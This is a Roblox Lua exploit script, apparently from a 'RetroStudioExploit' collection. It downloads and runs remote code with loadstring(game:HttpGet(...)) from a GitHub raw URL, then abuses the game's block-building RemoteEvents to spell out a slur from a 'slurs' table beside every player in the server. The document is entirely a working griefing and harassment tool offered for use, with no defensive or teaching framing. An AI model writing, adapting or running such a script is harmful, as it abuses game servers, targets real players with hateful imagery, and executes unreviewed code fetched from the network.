local word = "nazi"
local dist = 2
local offset = Vector3.new(0, 0, 0)
local modes = 1

local head = 'https://raw.githubusercontent.com/'
local github = 'RetroStudioExploit/'

local suffix = '/refs/heads/main/'
local API = loadstring(game:HttpGet(head .. github .. 'RetroScripts' .. suffix .. 'retrostudio/Skyblock/SkyblockApi.lua'))()
local ARTS = loadstring(game:HttpGet(head .. github .. 'RetroScripts' .. suffix .. 'Globals/CframeArts.lua'))()

local PS = game:GetService("Players")
function getRoot(char):Part
	return char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
end

function buildBlock(tools:RemoteEvent, pos)
	if modes == 1 then
        tools:FireServer(unpack({[1] = {[1] = pos, [2] = true}}))
    elseif modes == 2 then
        tools:FireServer(unpack({[1] = {[1] = pos}}))
    else
        tools:FireServer(unpack({[1] = {[1] = CFrame.new(pos, Vector3.zero)}}))
    end
end

for _, player in PS:GetPlayers() do
	for _, tools in pairs(API.getBlocks(game)) do
		for _, v in pairs(ARTS.slurs[word]) do
			local chr = getRoot(player.Character)
			if chr == nil then continue end

			local vec:Vector3 = Vector3.new((v.X * dist) + chr.Position.X, (v.Y * dist) + chr.Position.Y, chr.Position.Z) + offset
			buildBlock(tools, vec)
		end
	end
end